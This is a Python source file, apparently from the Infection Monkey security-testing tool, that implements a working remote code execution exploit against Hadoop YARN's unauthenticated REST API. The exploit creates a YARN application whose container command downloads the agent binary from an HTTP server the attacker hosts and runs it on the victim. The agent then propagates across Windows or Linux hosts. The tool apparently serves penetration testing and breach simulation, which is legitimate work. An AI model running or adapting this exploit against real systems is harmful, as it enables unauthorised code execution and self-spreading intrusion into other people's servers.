"""
    Remote code execution on HADOOP server with YARN and default settings
    Implementation is based on code from
    https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn
"""

import json
import logging
import posixpath
import random
import string
from typing import Tuple

import requests

from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.tags import (
    T1105_ATTACK_TECHNIQUE_TAG,
    T1203_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.web_rce import WebRCE
from infection_monkey.model import (
    HADOOP_LINUX_COMMAND,
    HADOOP_WINDOWS_COMMAND,
    ID_STRING,
    MONKEY_ARG,
)
from infection_monkey.utils.commands import build_monkey_commandline

logger = logging.getLogger(__name__)

HADOOP_EXPLOITER_TAG = "hadoop-exploiter"


class HadoopExploiter(WebRCE):
    _EXPLOITED_SERVICE = "Hadoop"
    HADOOP_PORTS = [("8088", False)]
    # How long we have our http server open for downloads in seconds
    DOWNLOAD_TIMEOUT = 60
    # Random string's length that's used for creating unique app name
    RAN_STR_LEN = 6

    def _exploiter_tags(self) -> Tuple[str, ...]:
        return (HADOOP_EXPLOITER_TAG, T1203_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG)

    def _propagation_tags(self) -> Tuple[str, ...]:
        return (HADOOP_EXPLOITER_TAG, T1105_ATTACK_TECHNIQUE_TAG)

    def __init__(self):
        super(HadoopExploiter, self).__init__()

    def _exploit_host(self):
        # Try to get exploitable url
        urls = self.build_potential_urls(self.host.ip_addr, self.HADOOP_PORTS)
        self.add_vulnerable_urls(urls, True)
        if not self.vulnerable_urls:
            self.exploit_result.error_message = f"No vulnerable urls has been found for {self.host}"
            return self.exploit_result

        monkey_path_on_victim = get_agent_dst_path(self.host)

        http_path, http_thread = HTTPTools.create_locked_transfer(
            self.host, str(monkey_path_on_victim), self.agent_binary_repository
        )

        try:
            command = self._build_command(monkey_path_on_victim, http_path)

            if self.exploit(self.vulnerable_urls[0], command):
                self.add_executed_cmd(command)
                self.exploit_result.exploitation_success = True
                self.exploit_result.propagation_success = True

        except requests.RequestException as err:
            error_message = str(err)
            self._publish_exploitation_event(False, error_message=error_message)
            self._publish_propagation_event(False, error_message=error_message)
        finally:
            http_thread.join(self.DOWNLOAD_TIMEOUT)
            http_thread.stop()

        return self.exploit_result

    def exploit(self, url: str, command: str):
        if self._is_interrupted():
            self._set_interrupted()
            return False

        # Get the newly created application id
        resp = requests.post(
            posixpath.join(url, "ws/v1/cluster/apps/new-application"), timeout=LONG_REQUEST_TIMEOUT
        )
        resp_dict = json.loads(resp.content)
        app_id = resp_dict["application-id"]

        # Create a random name for our application in YARN
        # random.SystemRandom can block indefinitely in Linux
        rand_name = ID_STRING + "".join(
            [random.choice(string.ascii_lowercase) for _ in range(self.RAN_STR_LEN)]  # noqa: DUO102
        )
        payload = self._build_payload(app_id, rand_name, command)

        if self._is_interrupted():
            self._set_interrupted()
            return False

        resp = requests.post(
            posixpath.join(url, "ws/v1/cluster/apps/"), json=payload, timeout=LONG_REQUEST_TIMEOUT
        )

        success = resp.status_code == 202
        message = "" if success else f"Failed to exploit via {url}"
        self._publish_exploitation_event(success, error_message=message)
        self._publish_propagation_event(success, error_message=message)
        return success

    def check_if_exploitable(self, url):
        try:
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/new-application"),
                timeout=LONG_REQUEST_TIMEOUT,
            )
        except requests.ConnectionError:
            return False
        return resp.status_code == 200

    def _build_command(self, path, http_path):
        # Build command to execute
        monkey_cmd = build_monkey_commandline(self.servers, self.current_depth + 1)
        if self.host.is_windows():
            base_command = HADOOP_WINDOWS_COMMAND
        else:
            base_command = HADOOP_LINUX_COMMAND

        return base_command % {
            "monkey_path": path,
            "http_path": http_path,
            "monkey_type": MONKEY_ARG,
            "parameters": monkey_cmd,
        }

    @staticmethod
    def _build_payload(app_id, name, command):
        payload = {
            "application-id": app_id,
            "application-name": name,
            "am-container-spec": {
                "commands": {
                    "command": command,
                }
            },
            "application-type": "YARN",
        }
        return payload
